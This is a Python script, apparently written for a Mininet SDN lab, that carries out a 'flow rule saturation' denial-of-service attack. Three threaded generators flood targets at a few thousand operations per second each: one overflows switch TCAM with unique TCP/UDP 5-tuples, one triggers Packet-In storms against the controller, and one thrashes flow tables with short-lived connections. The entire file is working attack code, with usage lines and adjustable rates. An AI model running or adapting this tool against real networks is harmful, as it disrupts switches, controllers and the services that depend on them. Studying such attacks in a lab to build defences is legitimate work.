#!/usr/bin/env python3
"""
Flow Rule Saturation Attack
============================
Overwhelms SDN switches by:
1. TCAM overflow - generating flows with unique 5-tuples
2. Packet-In storm - triggering controller processing
3. Flow table thrashing - rapid flow installation/eviction

Usage:
    mininet> h1 python3 attacks/attack_flow_saturation.py --target-pod 2 --duration 300 --rate 8000 &
    mininet> h5 python3 attacks/attack_flow_saturation.py --target-pod 2 --duration 300 --rate 8000 &
"""

import socket
import random
import time
import argparse
import threading
import struct
import itertools

TOPOLOGY = {
    0: ['10.0.0.1', '10.0.0.2', '10.0.1.1', '10.0.1.2'],
    1: ['10.1.0.1', '10.1.0.2', '10.1.1.1', '10.1.1.2'],
    2: ['10.2.0.1', '10.2.0.2', '10.2.1.1', '10.2.1.2'],
    3: ['10.3.0.1', '10.3.0.2', '10.3.1.1', '10.3.1.2']
}


class TCAMOverflowGenerator:
    """Generate flows with unique 5-tuples to overflow TCAM"""
    
    def __init__(self, target_ips, rate=8000):
        self.target_ips = target_ips
        self.rate = rate
        self.active = False
        self.stats = {'flows': 0, 'packets': 0, 'bytes': 0}
        self.used_ports = set()
        self.port_pool = list(range(1024, 65535))
        random.shuffle(self.port_pool)
        self.port_idx = 0
    
    def get_unique_port(self):
        """Get unique source port for flow diversity"""
        if self.port_idx >= len(self.port_pool):
            random.shuffle(self.port_pool)
            self.port_idx = 0
        port = self.port_pool[self.port_idx]
        self.port_idx += 1
        return port
    
    def generate_unique_tcp_flow(self, target_ip):
        """Generate TCP flow with unique 5-tuple"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            # Unique source port
            source_port = self.get_unique_port()
            sock.bind(('', source_port))
            
            # Rotating target ports for 5-tuple diversity
            target_port = random.choice([80, 443, 8080, 8443, 22, 23, 21, 
                                        3306, 5432, 27017, 6379, 9200])
            
            try:
                sock.connect((target_ip, target_port))
                # Minimal payload - goal is to create flow entry
                payload = bytes([random.randint(0, 255) for _ in range(random.randint(64, 256))])
                sock.send(payload)
                self.stats['bytes'] += len(payload)
                self.stats['packets'] += 1
            except:
                pass
            finally:
                sock.close()
                self.stats['flows'] += 1
        except:
            pass
    
    def generate_unique_udp_flow(self, target_ip):
        """Generate UDP flow with unique 5-tuple"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            source_port = self.get_unique_port()
            sock.bind(('', source_port))
            
            target_port = random.choice([53, 123, 161, 162, 514, 5060, 5061])
            
            # Send small burst to establish flow
            num_packets = random.randint(2, 8)
            for _ in range(num_packets):
                payload = bytes([random.randint(0, 255) for _ in range(random.randint(64, 512))])
                sock.sendto(payload, (target_ip, target_port))
                self.stats['bytes'] += len(payload)
                self.stats['packets'] += 1
                time.sleep(0.001)
            
            sock.close()
            self.stats['flows'] += 1
        except:
            pass
    
    def run_attack(self, duration):
        """Execute TCAM overflow attack"""
        self.active = True
        start_time = time.time()
        flow_interval = 1.0 / self.rate if self.rate > 0 else 0.0001
        
        print(f"[FLOW-SAT] Starting TCAM overflow attack")
        print(f"  Rate: {self.rate} unique flows/sec")
        
        while self.active and (time.time() - start_time) < duration:
            target_ip = random.choice(self.target_ips)
            
            # Mix protocols
            if random.random() < 0.6:
                self.generate_unique_tcp_flow(target_ip)
            else:
                self.generate_unique_udp_flow(target_ip)
            
            time.sleep(flow_interval)
            
            if int(time.time() - start_time) % 10 == 0 and self.stats['flows'] > 0:
                elapsed = time.time() - start_time
                print(f"[FLOW-SAT] {elapsed:.0f}s - Unique flows: {self.stats['flows']:,}, "
                      f"Rate: {self.stats['flows']/elapsed:.1f} flows/s")
        
        self.active = False
        total_time = time.time() - start_time
        print(f"\n[FLOW-SAT] TCAM Overflow Complete:")
        print(f"  Unique flows: {self.stats['flows']:,}")
        print(f"  Packets:      {self.stats['packets']:,}")
        print(f"  Bytes:        {self.stats['bytes']:,}")


class PacketInStormGenerator:
    """Generate Packet-In storm to overload controller"""
    
    def __init__(self, target_ips, rate=5000):
        self.target_ips = target_ips
        self.rate = rate
        self.active = False
        self.stats = {'flows': 0, 'packets': 0, 'bytes': 0}
    
    def generate_packet_in_trigger(self, target_ip):
        """Generate flow likely to trigger Packet-In"""
        try:
            # Use UDP to random high ports (unlikely to have flow rules)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            source_port = random.randint(40000, 65535)
            sock.bind(('', source_port))
            
            # Random high port on target
            target_port = random.randint(30000, 65535)
            
            # Single packet to trigger Packet-In
            payload = bytes([random.randint(0, 255) for _ in range(random.randint(64, 256))])
            sock.sendto(payload, (target_ip, target_port))
            
            self.stats['bytes'] += len(payload)
            self.stats['packets'] += 1
            self.stats['flows'] += 1
            
            sock.close()
        except:
            pass
    
    def run_attack(self, duration):
        """Execute Packet-In storm"""
        self.active = True
        start_time = time.time()
        interval = 1.0 / self.rate if self.rate > 0 else 0.0001
        
        print(f"[PKT-IN] Starting Packet-In storm")
        print(f"  Rate: {self.rate} packets/sec")
        
        while self.active and (time.time() - start_time) < duration:
            target_ip = random.choice(self.target_ips)
            self.generate_packet_in_trigger(target_ip)
            time.sleep(interval)
            
            if int(time.time() - start_time) % 10 == 0 and self.stats['flows'] > 0:
                elapsed = time.time() - start_time
                print(f"[PKT-IN] {elapsed:.0f}s - Packet-Ins: {self.stats['flows']:,}, "
                      f"Rate: {self.stats['flows']/elapsed:.1f} /s")
        
        self.active = False
        print(f"\n[PKT-IN] Storm Complete: {self.stats['flows']:,} Packet-Ins")


class FlowTableThrashingGenerator:
    """Cause rapid flow installation/eviction"""
    
    def __init__(self, target_ips, rate=3000):
        self.target_ips = target_ips
        self.rate = rate
        self.active = False
        self.stats = {'flows': 0, 'packets': 0, 'bytes': 0}
    
    def generate_short_lived_flow(self, target_ip):
        """Generate very short-lived flow"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            target_port = random.choice([80, 443, 8080])
            
            try:
                sock.connect((target_ip, target_port))
                # Send minimal data and close immediately
                sock.send(b'X' * 64)
                self.stats['bytes'] += 64
                self.stats['packets'] += 1
            except:
                pass
            finally:
                sock.close()
                self.stats['flows'] += 1
        except:
            pass
    
    def run_attack(self, duration):
        """Execute flow table thrashing"""
        self.active = True
        start_time = time.time()
        interval = 1.0 / self.rate if self.rate > 0 else 0.0001
        
        print(f"[THRASH] Starting flow table thrashing")
        print(f"  Rate: {self.rate} short flows/sec")
        
        while self.active and (time.time() - start_time) < duration:
            target_ip = random.choice(self.target_ips)
            self.generate_short_lived_flow(target_ip)
            time.sleep(interval)
            
            if int(time.time() - start_time) % 10 == 0 and self.stats['flows'] > 0:
                elapsed = time.time() - start_time
                print(f"[THRASH] {elapsed:.0f}s - Short flows: {self.stats['flows']:,}")
        
        self.active = False
        print(f"\n[THRASH] Complete: {self.stats['flows']:,} short-lived flows")


class FlowRuleSaturationAttack:
    """Orchestrate multi-vector flow saturation attack"""
    
    def __init__(self, target_pod, tcam_rate=8000, pkt_in_rate=5000, thrash_rate=3000):
        self.target_ips = TOPOLOGY[target_pod]
        self.tcam_gen = TCAMOverflowGenerator(self.target_ips, tcam_rate)
        self.pkt_in_gen = PacketInStormGenerator(self.target_ips, pkt_in_rate)
        self.thrash_gen = FlowTableThrashingGenerator(self.target_ips, thrash_rate)
    
    def launch(self, duration):
        """Launch coordinated flow saturation attack"""
        total_rate = (self.tcam_gen.rate + self.pkt_in_gen.rate + 
                     self.thrash_gen.rate)
        
        print(f"\n{'='*70}")
        print(f"  Flow Rule Saturation Attack")
        print(f"{'='*70}")
        print(f"  Targets:        {', '.join(self.target_ips)}")
        print(f"  TCAM overflow:  {self.tcam_gen.rate} unique flows/sec")
        print(f"  Packet-In:      {self.pkt_in_gen.rate} packets/sec")
        print(f"  Thrashing:      {self.thrash_gen.rate} short flows/sec")
        print(f"  Total rate:     {total_rate} operations/sec")
        print(f"  Duration:       {duration}s")
        print(f"  Est. flows:     {total_rate * duration:,}")
        print(f"{'='*70}\n")
        
        threads = []
        
        # Start all attack vectors
        t1 = threading.Thread(target=self.tcam_gen.run_attack, args=(duration,))
        t2 = threading.Thread(target=self.pkt_in_gen.run_attack, args=(duration,))
        t3 = threading.Thread(target=self.thrash_gen.run_attack, args=(duration,))
        
        threads = [t1, t2, t3]
        
        for t in threads:
            t.start()
            time.sleep(0.3)
        
        for t in threads:
            t.join()
        
        # Aggregate statistics
        total_flows = (self.tcam_gen.stats['flows'] + 
                      self.pkt_in_gen.stats['flows'] + 
                      self.thrash_gen.stats['flows'])
        total_packets = (self.tcam_gen.stats['packets'] + 
                        self.pkt_in_gen.stats['packets'] + 
                        self.thrash_gen.stats['packets'])
        total_bytes = (self.tcam_gen.stats['bytes'] + 
                      self.pkt_in_gen.stats['bytes'] + 
                      self.thrash_gen.stats['bytes'])
        
        print(f"\n{'='*70}")
        print(f"  FINAL STATISTICS")
        print(f"{'='*70}")
        print(f"  TCAM flows:    {self.tcam_gen.stats['flows']:,}")
        print(f"  Packet-Ins:    {self.pkt_in_gen.stats['flows']:,}")
        print(f"  Thrash flows:  {self.thrash_gen.stats['flows']:,}")
        print(f"  {'─'*68}")
        print(f"  Total flows:   {total_flows:,}")
        print(f"  Total packets: {total_packets:,}")
        print(f"  Total bytes:   {total_bytes:,} ({total_bytes/1e6:.2f} MB)")
        print(f"  Achieved rate: {total_flows/duration:.1f} flows/s")
        print(f"{'='*70}\n")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Flow Rule Saturation Attack')
    parser.add_argument('--target-pod', type=int, default=2, choices=[0,1,2,3])
    parser.add_argument('--duration', type=int, default=300)
    parser.add_argument('--rate', type=int, default=8000,
                        help='TCAM overflow rate (flows/sec)')
    parser.add_argument('--pkt-in-rate', type=int, default=5000,
                        help='Packet-In storm rate')
    parser.add_argument('--thrash-rate', type=int, default=3000,
                        help='Flow thrashing rate')
    
    args = parser.parse_args()
    
    attack = FlowRuleSaturationAttack(
        target_pod=args.target_pod,
        tcam_rate=args.rate,
        pkt_in_rate=args.pkt_in_rate,
        thrash_rate=args.thrash_rate
    )
    
    attack.launch(args.duration)
